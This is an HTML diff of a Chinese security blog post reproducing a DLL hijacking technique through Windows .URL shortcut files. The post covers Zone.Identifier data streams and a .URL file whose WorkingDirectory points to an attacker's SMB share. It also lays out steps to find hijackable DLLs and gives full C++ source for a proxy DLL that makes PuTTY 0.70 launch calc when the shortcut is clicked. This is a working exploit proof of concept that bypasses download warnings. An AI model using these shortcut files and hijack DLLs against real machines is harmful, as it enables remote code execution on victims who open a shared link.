@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="DLL劫持 URL文件,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="通过URL文件进行DLL劫持-DLL Hijacking via URL files转载请注明出处：https://youngrichog.github.io/ 首先介绍下用于下载文件的Zone模型，或确切地说，是Zone.Identifiers 如果文件（通过网页浏览器等方式）被下载，Windows会向文件中添加一个名为Zone.Identifier的可选数据流（Alternative Data">
+<meta name="keywords" content="DLL劫持 URL文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过URL文件进行DLL劫持-DLL Hijacking via URL files">
+<meta property="og:url" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/index.html">
+<meta property="og:site_name" content="YoungRichOG">
+<meta property="og:description" content="通过URL文件进行DLL劫持-DLL Hijacking via URL files转载请注明出处：https://youngrichog.github.io/ 首先介绍下用于下载文件的Zone模型，或确切地说，是Zone.Identifiers 如果文件（通过网页浏览器等方式）被下载，Windows会向文件中添加一个名为Zone.Identifier的可选数据流（Alternative Data">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/7.png">
+<meta property="og:updated_time" content="2019-08-10T12:34:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过URL文件进行DLL劫持-DLL Hijacking via URL files">
+<meta name="twitter:description" content="通过URL文件进行DLL劫持-DLL Hijacking via URL files转载请注明出处：https://youngrichog.github.io/ 首先介绍下用于下载文件的Zone模型，或确切地说，是Zone.Identifiers 如果文件（通过网页浏览器等方式）被下载，Windows会向文件中添加一个名为Zone.Identifier的可选数据流（Alternative Data">
+<meta name="twitter:image" content="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/">
+
+
+
+
+
+  <title>通过URL文件进行DLL劫持-DLL Hijacking via URL files | YoungRichOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">YoungRichOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Web Pentester</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">通过URL文件进行DLL劫持-DLL Hijacking via URL files</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-16T13:41:42+08:00">
+                2018-12-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files"><a href="#通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files" class="headerlink" title="通过URL文件进行DLL劫持-DLL Hijacking via URL files"></a>通过URL文件进行DLL劫持-DLL Hijacking via URL files</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>首先介绍下用于下载文件的Zone模型，或确切地说，是Zone.Identifiers</p>
+<p>如果文件（通过网页浏览器等方式）被下载，Windows会向文件中添加一个名为Zone.Identifier的可选数据流（Alternative Data Stream，<a href="https://blogs.msdn.microsoft.com/jerrydixon/2007/09/20/alternate-data-streams/" target="_blank" rel="noopener">传送门</a>）。简单地说，可选数据流是一个数据（二进制或文本等），它并不存储于文件之中，而是链接到另一个文件。读取一个可选数据流的语法如下：:（&lt;磁盘上的真实文件&gt;:&lt;可选文件流名称&gt;）。 而具体到下载文件的场景中，这些附加信息描述了文件是从哪个区域下载的。在这里，我没有对这个模型及其具体含义进行深入讨论，但简短地说：如果从example.com这样的域名下载文件，该文件将被分配一个值为3的Zone ID：</p>
+<a id="more"></a>
+<p>从下图我们可以看到nbtscan-1.0.35.exe是通过互联网下载到的，可以看到ads，一旦ZoneId &gt; 2，如果受害者去点击攻击者共享的nbtscan-1.0.35.exe，Windows将为潜在的不安全文件扩展名显示警告对话框：<br><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/1.png" alt="img"></p>
+<p><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/2.png" alt="img"></p>
+<p><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/3.png" alt="img"></p>
+<p>不同值所对应的标记如下：<br>0 —— URLZONE_LOCAL_MACHINE（本地）<br>1 —— URLZONE_INTRANNET（内网）<br>2 —— URLZONE_TRUSTED（可信位置）<br>3 —— URLZONE_INTERNET（互联网）<br>4 —— URLZONE_UNTRUSTED（不可信位置）</p>
+<p><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/4.png" alt="img"></p>
+<p>在Windows上，可以使用 file:/// 协议处理程序来打开和远程执行SMB共享文件，格式如下：<br>file://attacker.com/SMBShare/</p>
+<p>如果是直接通过file打开exe或bat的话还是会显示警告对话框</p>
+<p>在完成扩展名的枚举之后，我发现，.URL文件能够从远程SMB共享中执行，并且没有出现任何警告对话框</p>
+<p>URL文件结构如下：</p>
+<p>Link to a local file:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL=C:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+<p>Link to a HTTP resource:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL=http://example.com</span><br></pre></td></tr></table></figure>
+<p>同样，这里不允许传递任何参数，我们似乎又回到了最初的起点。但幸好，我在网上找到了其他研究者。<br><a href="http://www.lyberty.com/encyc/articles/tech/dot_url_format_-_an_unofficial_guide.html" target="_blank" rel="noopener">http://www.lyberty.com/encyc/articles/tech/dot_url_format_-_an_unofficial_guide.html</a><br>记录了.URL文件的所有支持属性，大家有兴趣的可以看看</p>
+<p>最后这样，我就可以通过url文件进行dll劫持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL=file:///c:/&lt;pathToAnApplication&gt;</span><br><span class="line">WorkingDirectory=\\attacker.com\SMBShare</span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>win7 x64（受害者）<br>win10 x64（攻击者，smb共享文件）</p>
+<p>我选了Putty Release 0.70，然后在想如何进行dll劫持，我想到3种办法来找到存在能够劫持的dll：<br>1.现成工具DllHijackAuditor来找到能够被劫持的dll<br>2.自动化找到存在能够劫持的dll，这个自动化的思路找存在能够劫持的dll，感觉还是很不错的。<br>(1).Enumerate all .exe files in C:\Windows and its subfolders as I am only interested in applications, which are present by default.<br>(2).Create a .URL for each enumerated applications on a SMB share. Of course the URL directive points to the targeted application and the WorkingDirectory is set to the remote SMB share.<br>(3).Get a list of all the currently running processes as a base comparison.<br>(4).Start ProcessMonitor<br>(5).Set the filter so it only displays entries, where the path points to the remote share and ends with .DLL. Additionally only display entries, where the result contains NOT FOUND. This should display only entries for cases, when an application is trying to load a DLL from the SMB share.<br>(6).Execute a .URL file eg file://attacker.com/SMBShare/poc1.URL<br>(7).Get a list of all the currently running processes<br>(8).Compare the list with the process list created in step 3. Log the executed .URL file and all the new spawned processes. Kill all the new spawned processes to safe system resources.<br>(9).Repeat step 6,7 and 8 until all created .URL files were executed<br>3.手工查找，通过Procmon工具</p>
+<p>然后发现Putty 0.70版本，api-ms-win-core-fibers-l1-1-1.dll能够被劫持<br><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/5.png" alt="img"></p>
+<p>那么我们结合url文件来进行dll劫持，url文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut] </span><br><span class="line">URL=file:///c:/&lt;pathToAnApplication&gt; </span><br><span class="line">WorkingDirectory=\\attacker.com\SMBShare</span><br></pre></td></tr></table></figure>
+<p>将工作目录(WorkingDirectory)设置为我的SMB共享，URL设置为Putty程序路径，并强制其从我的远程共享中加载一个DLL</p>
+<p>DLL劫持代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">//Generate by DLLHijacker.py</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#pragma comment(linker,&quot;/EXPORT:IsThreadAFiber=_DLLHijacker_IsThreadAFiber,@1&quot;)</span><br><span class="line">#define EXTERNC extern &quot;C&quot;</span><br><span class="line">#define NAKED __declspec(naked)</span><br><span class="line">#define EXPORT __declspec(dllexport)</span><br><span class="line">#define ALCPP EXPORT NAKED</span><br><span class="line">#define ALSTD EXTERNC EXPORT NAKED void __stdcall</span><br><span class="line">#define ALCFAST EXTERNC EXPORT NAKED void __fastcall</span><br><span class="line">#define ALCDECL EXTERNC NAKED void __cdecl</span><br><span class="line">namespace DLLHijacker</span><br><span class="line">&#123;</span><br><span class="line">    HMODULE m_hModule = NULL;</span><br><span class="line">    DWORD m_dwReturn[17] = &#123;0&#125;;</span><br><span class="line">    inline BOOL WINAPI Load()</span><br><span class="line">    &#123;</span><br><span class="line">        TCHAR tzPath[MAX_PATH];</span><br><span class="line">        lstrcpy(tzPath, TEXT(&quot;api-ms-win-core-fibers-l1-1-1.dll&quot;));</span><br><span class="line">        m_hModule = LoadLibrary(tzPath);</span><br><span class="line">        if (m_hModule == NULL)</span><br><span class="line">            return FALSE;</span><br><span class="line">        return (m_hModule != NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    inline VOID WINAPI Free()</span><br><span class="line">    &#123;</span><br><span class="line">        if (m_hModule)</span><br><span class="line">            FreeLibrary(m_hModule);</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC WINAPI GetAddress(PCSTR pszProcName)</span><br><span class="line">    &#123;</span><br><span class="line">        FARPROC fpAddress;</span><br><span class="line">        CHAR szProcName[16];</span><br><span class="line">        fpAddress = GetProcAddress(m_hModule, pszProcName);</span><br><span class="line">        if (fpAddress == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            if (HIWORD(pszProcName) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                wsprintf(szProcName, &quot;%d&quot;, pszProcName);</span><br><span class="line">                pszProcName = szProcName;</span><br><span class="line">            &#125;</span><br><span class="line">            ExitProcess(-2);</span><br><span class="line">        &#125;</span><br><span class="line">        return fpAddress;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">using namespace DLLHijacker;</span><br><span class="line">VOID Hijack()</span><br><span class="line">&#123;</span><br><span class="line">    WinExec(&quot;calc&quot;,SW_NORMAL);</span><br><span class="line">&#125;</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">    if (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">        if(Load())</span><br><span class="line">            Hijack();</span><br><span class="line">    &#125;</span><br><span class="line">    else if (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">    &#123;</span><br><span class="line">        Free();</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">ALCDECL DLLHijacker_IsThreadAFiber(void)</span><br><span class="line">&#123;</span><br><span class="line">        __asm POP m_dwReturn[0 * TYPE long];</span><br><span class="line">    GetAddress(&quot;IsThreadAFiber&quot;)();</span><br><span class="line">    __asm JMP m_dwReturn[0 * TYPE long];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/6.png" alt="img"></p>
+<p>受害者点击poc.url后，远程从smb共享文件加载dll，我们发现Putty可以被dll劫持，弹出calc，可以发现成功绕过了Zone Identifiers这个问题</p>
+<p><img src="/2018/12/16/通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files/7.png" alt="img"></p>
+<h2 id="参考来源："><a href="#参考来源：" class="headerlink" title="参考来源："></a>参考来源：</h2><p><a href="https://insert-script.blogspot.com/2018/05/dll-hijacking-via-url-files.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2018/05/dll-hijacking-via-url-files.html</a><br><a href="https://blogs.msdn.microsoft.com/jerrydixon/2007/09/20/alternate-data-streams/" target="_blank" rel="noopener">https://blogs.msdn.microsoft.com/jerrydixon/2007/09/20/alternate-data-streams/</a><br><a href="http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4949.html" target="_blank" rel="noopener">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4949.html</a></p>
+<h2 id="Trick的一些思考："><a href="#Trick的一些思考：" class="headerlink" title="Trick的一些思考："></a>Trick的一些思考：</h2><p>多种方式的结合，例如利用自解压</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DLL劫持-URL文件/" rel="tag"># DLL劫持 URL文件</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/15/SettingContent-ms-CVE-2018-8414复现/" rel="next" title=".SettingContent-ms CVE-2018-8414复现">
+                <i class="fa fa-chevron-left"></i> .SettingContent-ms CVE-2018-8414复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/14/Mimikatz实用记录/" rel="prev" title="Mimikatz实用记录">
+                Mimikatz实用记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">YoungRichOG</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#通过URL文件进行DLL劫持-DLL-Hijacking-via-URL-files"><span class="nav-number">1.</span> <span class="nav-text">通过URL文件进行DLL劫持-DLL Hijacking via URL files</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建："><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考来源："><span class="nav-number">1.2.</span> <span class="nav-text">参考来源：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick的一些思考："><span class="nav-number">1.3.</span> <span class="nav-text">Trick的一些思考：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YoungRichOG</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv"><br>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
